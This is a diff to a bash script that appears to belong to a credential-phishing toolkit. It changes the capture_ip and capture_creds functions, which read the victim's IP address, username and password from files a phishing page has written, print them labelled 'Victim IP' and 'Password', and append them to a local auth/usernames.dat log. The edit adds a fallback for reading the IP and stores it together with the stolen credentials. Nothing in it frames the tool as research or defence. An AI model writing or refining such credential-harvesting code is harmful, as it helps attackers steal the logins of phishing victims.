@@ -392,24 +392,38 @@ setup_site() {
 
 ## Get IP address
 capture_ip() {
-	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
-	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
-	cat .server/www/ip.txt >> auth/ip.txt
+    victim_ip=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+    IFS=$'\n'
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim's IP : ${BLUE}$victim_ip"
+    echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+    cat .server/www/ip.txt >> auth/ip.txt
 }
 
 ## Get credentials
 capture_creds() {
-	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
-	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
-	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo "-------------------------------------" >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+    # Ensure victim_ip is set
+    if [ -z "$victim_ip" ]; then
+        # If IP was not captured, try to read it directly
+        victim_ip=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
+    fi
+    
+    # Extract username and password
+    ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
+    PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+    
+    IFS=$'\n'
+    # Print info to console
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP : ${BLUE}$victim_ip"
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
+    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+    echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+    
+    # Save IP and credentials to file
+    echo "Victim IP: $victim_ip" >> auth/usernames.dat
+    echo "Account: $ACCOUNT" >> auth/usernames.dat
+    echo "Password: $PASSWORD" >> auth/usernames.dat
+    # Add separator
+    echo "-------------------------------------------------------" >> auth/usernames.dat
 }
 
 ## Print data
